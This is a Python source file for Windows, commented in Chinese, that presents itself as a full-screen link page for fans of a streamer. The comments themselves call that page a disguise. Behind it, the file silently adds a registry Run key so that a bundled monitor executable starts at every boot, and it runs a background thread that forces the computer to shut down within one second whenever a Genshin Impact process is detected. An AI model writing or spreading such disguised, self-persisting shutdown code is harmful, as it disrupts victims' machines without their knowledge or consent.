import os,winreg,time,psutil,webbrowser,sys,threading
import tkinter as tk
from PIL import ImageTk,Image
from PIL import ImageEnhance

# 雾
# 启动原神自动关机
# 原神进程
AppName = ["YuanShen.exe", "GenshinImpact.exe"]


def check_and_shutdown():


    # 不想做太绝的可以取消注释,并自己加以改进
    # print("监控是否正在游玩原神")

    while True:

        
        for proc in psutil.process_iter(["name"]):
            try:

                if proc.info["name"] in AppName:
                    # 此处同上
                    # print(f"检测到 ({proc.info['name']})！系统即将关机...")

                    # 设置1秒后关机,可以改为任意时间
                    os.system("shutdown -s -t 1")
                    return

            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):

                continue

        # 5秒的检测间隔
        time.sleep(5)



# 作为6657观众做的伪装,简单的tk界面
def machine() :
    root.title("6657相关链接跳转")

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()


    root.geometry(f"{screen_width}x{screen_height}")

    background = Image.open("玩机器/background.png")
    background = background.resize((1920,1080),Image.Resampling.LANCZOS)
    bg_brightness = ImageEnhance.Brightness(background)
    background = bg_brightness.enhance(1)

    bg_colours = ImageEnhance.Color(background)
    background = bg_colours.enhance(1)

    background = ImageTk.PhotoImage(background)
    root_bg =tk.Label(root,image = background,bd = 0,padx=0,pady=0)
    root.bg = background
    root_bg.pack(fill = "both",expand = True)

    but1_image = Image.open("玩机器/斗鱼6657.JPG")
    but1_image = but1_image.resize((150,150),Image.Resampling.LANCZOS)
    but1_image = ImageTk.PhotoImage(but1_image)

    but2_image = Image.open("玩机器/玩机器烂梗合集.png")
    but2_image = but2_image.resize((150,150),Image.Resampling.LANCZOS)
    but2_image = ImageTk.PhotoImage(but2_image)

    hltv = Image.open("玩机器/hltv.JPG")
    hltv = hltv.resize((150,100),Image.Resampling.LANCZOS)
    hltv = ImageTk.PhotoImage(hltv)

    but1 = tk.Button(root_bg, image=but1_image,text="前往玩机器小众宝藏直播间",compound="top",
                     command= lambda :webbrowser.open(
        "https://www.douyu.com/6979222?dyshid=2092fb25-35e1dfe436d8bccc061a7e9300091701")
              ,font=("Microsoft YaHei",10))
    but1.image1 = but1_image
    but1.pack(side="left",anchor="sw",padx=50,pady=50)

    but2 = tk.Button(root_bg,image=but2_image,text="前往玩机器烂梗合集\n然后去直播间刷烂梗吧！！！",
                     compound="top",command=lambda :webbrowser.open("https://sb6657.cn/"),
                     font=("Microsoft YaHei",10))
    but2.image1 = but2_image
    but2.pack(side="right",anchor="se",padx=50,pady=50)

    hltv_but = tk.Button(root_bg,image=hltv,text="前往HLTV\n没有魔法手段和小插件可能进不去\n和超多不良广告",
                         compound="top",command=lambda :webbrowser.open("https://www.hltv.org/"),
                         font=("Microsoft YaHei",10))
    hltv_but.image = hltv
    hltv_but.pack(side="right",anchor="se",pady=50,padx=0)

    exitbut = tk.Button(root_bg,text="按此处或q退出,按esc可以退出全屏",
                        command=lambda :root.destroy(),
                        bd=0,
                        highlightthickness=0,
                        font=("Microsoft YaHei",10))
    exitbut.pack(side="left",anchor="nw",pady=0,padx=0)
    root.bind("<Escape>",exit_fullscreen)
    root.bind("q",lambda e:root.destroy())


def exit_fullscreen(event=None):
    root.attributes('-fullscreen',False)


def set_backend_autostart_exe(app_name):
    # 将监控程序与该程序放在一起
    # 1. 获取当前 OpenGenshin.exe 所在的文件夹目录
    current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))

    # 2. 拼接出同目录下的后台监控检测程序的绝对路径,此处将监控程序backend_monitor.exe放在了玩机器文件夹下.
    backend_exe_path = os.path.join(current_dir, r"玩机器\backend_monitor.exe")

    # 如果检测到后台检测程序确实存在，则写入注册表
    if os.path.exists(backend_exe_path):
        # 加上双引号防止路径中含有空格导致启动失败
        start_command = f'"{backend_exe_path}"'

        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, start_command)
            winreg.CloseKey(key)
            print("【成功】已将后台监控 EXE 路径写入开机自启动！")
        except Exception as e:
            print(f"写入注册表失败: {e}")
    else:
        print("【错误】未在当前目录下找到 backend_monitor.exe，无法设置自启动。")



if __name__ == "__main__":
    # 检查并设置成开机自启动
    set_backend_autostart_exe("6657upup")


    # 1. 创建并启动子线程，让 check_and_shutdown 在后台独立运行
    """如果不想做太绝,第一次启动就放过,把第142行注释掉,143行取消注释,但无法改变后续的开机自启动.若想取消开机自启动,可以看仓库"""
    t = threading.Thread(target=check_and_shutdown)
    # t = threading.Thread(target=check_and_shutdown,daemon=True)
    t.start()

    # 2. 启动伪装(6657upup)
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    machine()

    root.mainloop()
